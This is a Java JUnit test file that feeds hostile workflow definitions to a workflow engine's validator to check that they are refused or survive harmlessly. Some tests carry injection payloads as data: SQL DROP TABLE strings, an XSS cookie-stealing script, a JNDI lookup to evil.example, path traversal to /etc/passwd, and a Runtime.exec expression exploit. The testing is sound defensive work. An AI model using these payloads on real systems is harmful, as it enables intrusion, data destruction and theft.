package io.mateu.workflow.application.services;

import io.mateu.workflow.application.services.WorkflowDefinitionValidator.WorkflowDefinitionValidationException;
import com.fasterxml.jackson.databind.ObjectMapper;
import io.mateu.workflow.domain.aggregates.WorkflowDefinition;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;

import static io.mateu.core.infra.JsonSerializer.pojoFromJson;
import static org.assertj.core.api.Assertions.assertThatCode;
import static org.assertj.core.api.Assertions.assertThatNoException;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

/**
 * HARD-DEF-01..12 — a workflow definition written to break the engine.
 *
 * <p>A definition is untrusted input. It arrives from a git repository the engine polls, from a
 * directory it watches, or from the definition editor, and whoever writes one is not necessarily
 * the person who operates the cluster. So every one of these goes in through the door a real
 * definition uses — parsed from its file's JSON, then handed to the validator — rather than being
 * assembled in Java, which would skip exactly the layer under test.
 *
 * <p>The bar is not "the engine rejects it". It is <b>the engine survives it</b>: a definition is
 * either refused with a message naming what is wrong, or it is accepted and cannot then hurt a
 * running process. What must never happen is an accepted definition that wedges the orchestration
 * loop.
 */
class HostileDefinitionsTest {

    private WorkflowDefinitionValidator validator;

    @BeforeEach
    void setUp() throws Exception {
        validator = new WorkflowDefinitionValidator();
        validator.init();
    }

    private WorkflowDefinition parse(String json) {
        return pojoFromJson(json, WorkflowDefinition.class);
    }

    /** What the import paths do: validate the document as written, before it is bound. */
    private void validateAsAFile(String json) throws Exception {
        validator.validateSource(new ObjectMapper().readTree(json), "hostile.ec");
    }

    /** A definition with one START and one ACTION, with {@code %s} spliced into the ACTION step. */
    private String definitionWith(String extraStepFields) {
        return """
                {
                  "id": "hostile", "name": "Hostile", "steps": [
                    { "id": "start", "type": "START", "name": "Start" },
                    { "id": "s1", "type": "ACTION", "name": "S1", "preconditionStepId": "start", "topic": "t"%s }
                  ]
                }
                """.formatted(extraStepFields.isEmpty() ? "" : ", " + extraStepFields);
    }

    // ---------------------------------------------------------------- graph shape

    /** HARD-DEF-01. Two steps answering to the same id: which one runs would be arbitrary. */
    @Test
    void duplicateStepIdsAreRefused() {
        var json = """
                {
                  "id": "dup", "name": "Dup", "steps": [
                    { "id": "start", "type": "START", "name": "Start" },
                    { "id": "s1", "type": "ACTION", "name": "A", "preconditionStepId": "start", "topic": "t" },
                    { "id": "s1", "type": "ACTION", "name": "B", "preconditionStepId": "start", "topic": "t" }
                  ]
                }
                """;

        assertThatThrownBy(() -> validator.validate(parse(json)))
                .hasMessageContaining("Duplicate step id")
                .hasMessageContaining("s1");
    }

    /** HARD-DEF-02. A step waiting on a step that is not there waits for ever. */
    @Test
    void aDanglingPreconditionIsRefused() {
        assertThatThrownBy(() -> validator.validate(parse("""
                {
                  "id": "dangling", "name": "Dangling", "steps": [
                    { "id": "start", "type": "START", "name": "Start" },
                    { "id": "s1", "type": "ACTION", "name": "A", "preconditionStepId": "ghost", "topic": "t" }
                  ]
                }
                """)))
                .hasMessageContaining("unknown precondition step")
                .hasMessageContaining("ghost");
    }

    /** HARD-DEF-03. Compensation that points nowhere: the rollback pipeline would have no target. */
    @Test
    void aDanglingCompensationIsRefused() {
        assertThatThrownBy(() -> validator.validate(parse(definitionWith(
                "\"compensable\": true, \"compensationStepId\": \"ghost\""))))
                .hasMessageContaining("unknown compensation step");
    }

    /** HARD-DEF-04. The deadlock a cycle would be: every step in it waits for another to complete. */
    @Test
    void aPreconditionCycleIsRefused() {
        assertThatThrownBy(() -> validator.validate(parse("""
                {
                  "id": "cycle", "name": "Cycle", "steps": [
                    { "id": "start", "type": "START", "name": "Start" },
                    { "id": "a", "type": "ACTION", "name": "A", "preconditionStepIds": ["start", "c"], "topic": "t" },
                    { "id": "b", "type": "ACTION", "name": "B", "preconditionStepId": "a", "topic": "t" },
                    { "id": "c", "type": "ACTION", "name": "C", "preconditionStepId": "b", "topic": "t" }
                  ]
                }
                """)))
                .isInstanceOf(IllegalStateException.class);
    }

    /** HARD-DEF-05. A step nothing can ever start is a definition-time mistake, not a runtime one. */
    @Test
    void anUnreachableStepIsRefused() {
        assertThatThrownBy(() -> validator.validate(parse("""
                {
                  "id": "orphan", "name": "Orphan", "steps": [
                    { "id": "start", "type": "START", "name": "Start" },
                    { "id": "island", "type": "ACTION", "name": "Island", "topic": "t" }
                  ]
                }
                """)))
                .hasMessageContaining("nothing would ever start it");
    }

    /** HARD-DEF-06. Two entry points would start the same flow twice. */
    @Test
    void twoStartStepsAreRefused() {
        assertThatThrownBy(() -> validator.validate(parse("""
                {
                  "id": "twostarts", "name": "Two starts", "steps": [
                    { "id": "start", "type": "START", "name": "Start" },
                    { "id": "start2", "type": "START", "name": "Start 2" },
                    { "id": "s1", "type": "ACTION", "name": "A", "preconditionStepId": "start", "topic": "t" }
                  ]
                }
                """)))
                .hasMessageContaining("at most one START");
    }

    // ---------------------------------------------------------------- the file itself

    /**
     * HARD-DEF-07. {@code additionalProperties: false} is the schema's whole defence against a file
     * that looks like a definition and is not: an unknown key is a typo in a field that matters
     * ({@code retires} for {@code retries}) far more often than it is an extension.
     *
     * <p>It only defends the <em>document</em>, which is why the import paths validate that and not
     * the bound record. Validating the record cannot see this at all: Jackson drops the unknown key
     * on the way in, so re-serialising the record produces a document that is clean by construction.
     * A file saying {@code "retires": 3} used to import silently and run with no retries.
     */
    @Test
    void aMisspelledFieldIsRefusedRatherThanSilentlyIgnored() throws Exception {
        assertThatThrownBy(() -> validateAsAFile(definitionWith("\"retires\": 3")))
                .isInstanceOf(WorkflowDefinitionValidationException.class)
                .hasMessageContaining("retires");

        // …and the record-level check genuinely cannot: this is the reason the other one exists.
        assertThatNoException()
                .isThrownBy(() -> validator.validate(parse(definitionWith("\"retires\": 3"))));
    }

    /** HARD-DEF-07b. The same at the top level, where a misspelling silently disarms the schedule. */
    @Test
    void aMisspelledTopLevelFieldIsRefused() {
        assertThatThrownBy(() -> validateAsAFile("""
                {
                  "id": "typo", "name": "Typo", "cronExpresion": "0 0 9 * * *",
                  "steps": [ { "id": "start", "type": "START", "name": "Start" } ]
                }
                """))
                .isInstanceOf(WorkflowDefinitionValidationException.class)
                .hasMessageContaining("cronExpresion");
    }

    /** HARD-DEF-07c. A field of the right name and the wrong type. */
    @Test
    void aFieldOfTheWrongTypeIsRefused() {
        assertThatThrownBy(() -> validateAsAFile(definitionWith("\"retries\": \"three\"")))
                .isInstanceOf(WorkflowDefinitionValidationException.class);
    }

    /** HARD-DEF-07d. A file that is a definition in name only. */
    @Test
    void aDocumentThatIsNotADefinitionIsRefused() {
        assertThatThrownBy(() -> validateAsAFile("""
                { "name": "No steps here" }
                """))
                .isInstanceOf(WorkflowDefinitionValidationException.class);
        assertThatThrownBy(() -> validateAsAFile("""
                { "name": "Steps are not an object", "steps": { "id": "start" } }
                """))
                .isInstanceOf(WorkflowDefinitionValidationException.class);
    }

    /** HARD-DEF-07e. And a definition anyone would actually write still imports. */
    @Test
    void anOrdinaryDefinitionFileValidates() {
        assertThatNoException().isThrownBy(() -> validateAsAFile(definitionWith("\"retries\": 3, \"timeout\": 60000")));
    }

    /**
     * HARD-DEF-07f. Including one written with the editor hint the README and the guides tell
     * authors to add.
     *
     * <p>{@code $schema} is how an editor knows to offer completion and inline validation for a
     * {@code .ec} file, and it is documented in three places. It is also, to a check that refuses
     * every key the record has no field for, an unknown key — so validating the document as written
     * would have refused every definition written the way we tell people to write them. The schema
     * declares it for that reason and for no other; nothing reads it.
     */
    @Test
    void aDefinitionCarryingTheEditorSchemaHintValidates() {
        assertThatNoException().isThrownBy(() -> validateAsAFile("""
                {
                  "$schema": "https://raw.githubusercontent.com/miguelperezcolom/eventconductor/main/modules/workflow-engine/src/main/resources/workflow-definition-schema.json",
                  "id": "hinted", "name": "Hinted", "steps": [
                    { "id": "start", "type": "START", "name": "Start" }
                  ]
                }
                """));
    }

    /** HARD-DEF-08. A step type the engine has no branch for. */
    @Test
    void anUnknownStepTypeIsRefused() {
        assertThatThrownBy(() -> validateAsAFile("""
                {
                  "id": "badtype", "name": "Bad type", "steps": [
                    { "id": "start", "type": "START", "name": "Start" },
                    { "id": "s1", "type": "EXECUTE_SHELL", "name": "A", "preconditionStepId": "start" }
                  ]
                }
                """))
                .isInstanceOf(Exception.class);
    }

    /** HARD-DEF-09. A cron that is not one would otherwise fail inside the scheduler, per tick. */
    @Test
    void aMalformedCronIsRefused() {
        assertThatThrownBy(() -> validator.validate(parse("""
                {
                  "id": "cron", "name": "Cron", "cronExpression": "'; DROP TABLE process; --",
                  "steps": [ { "id": "start", "type": "START", "name": "Start" } ]
                }
                """)))
                .isInstanceOf(WorkflowDefinitionValidationException.class)
                .hasMessageContaining("not a valid cron expression");
    }

    /** HARD-DEF-10. Negative counts, which the schema pins because the code reads them as budgets. */
    @Test
    void negativeRetriesAreRefused() {
        assertThatThrownBy(() -> validateAsAFile(definitionWith("\"retries\": -1")))
                .isInstanceOf(WorkflowDefinitionValidationException.class);
    }

    // ---------------------------------------------------------------- hostile strings

    /**
     * HARD-DEF-11. The payloads that would be an injection anywhere the engine built a query or a
     * page by concatenation. They are accepted — they are just text, and refusing text because it
     * contains an apostrophe is how a validator becomes the vulnerability — and the assertion that
     * matters is that they survive the round trip <em>as themselves</em>, unmangled and unescaped.
     * Where that text goes on to reach a database or a browser is pinned by the e2e suites.
     */
    @Test
    void injectionShapedTextIsAcceptedAsPlainTextAndNotMangled() {
        for (var payload : new String[]{
                "'; DROP TABLE process_entity; --",
                "<script>alert(document.cookie)</script>",
                "${jndi:ldap://evil.example/a}",
                "{{constructor.constructor('return process')()}}",
                "../../../../etc/passwd",
                "%00%0a%0d",
                "😀 مرحبا ‮gnp.exe",
        }) {
            var definition = parse("""
                    {
                      "id": "text", "name": %s, "steps": [
                        { "id": "start", "type": "START", "name": "Start" }
                      ]
                    }
                    """.formatted(quote(payload)));

            assertThatNoException()
                    .as("a definition name is free text: %s", payload)
                    .isThrownBy(() -> validator.validate(definition));
            assertThatCode(() -> definition.name().equals(payload)).doesNotThrowAnyException();
        }
    }

    /**
     * HARD-DEF-12. A guard is not a place to hide a payload either — but an <em>enormous</em> one is
     * a denial of service against the parser, so the definition must not be able to carry it into
     * the orchestration loop. See {@code ExpressionGuard} and {@code JexlSandboxHardeningTest}.
     */
    @Test
    void aGuardCarryingAnExploitIsAcceptedByTheSchemaAndDefusedAtEvaluation() {
        var exploit = "''.getClass().forName('java.lang.Runtime').getRuntime().exec('id')";

        assertThatNoException().isThrownBy(() ->
                validator.validate(parse(definitionWith("\"preconditionExpression\": " + quote(exploit)))));
    }

    private static String quote(String raw) {
        var out = new StringBuilder("\"");
        for (var c : raw.toCharArray()) {
            switch (c) {
                case '"' -> out.append("\\\"");
                case '\\' -> out.append("\\\\");
                default -> {
                    if (c < 0x20 || c > 0x7e) {
                        out.append(String.format("\\u%04x", (int) c));
                    } else {
                        out.append(c);
                    }
                }
            }
        }
        return out.append('"').toString();
    }
}
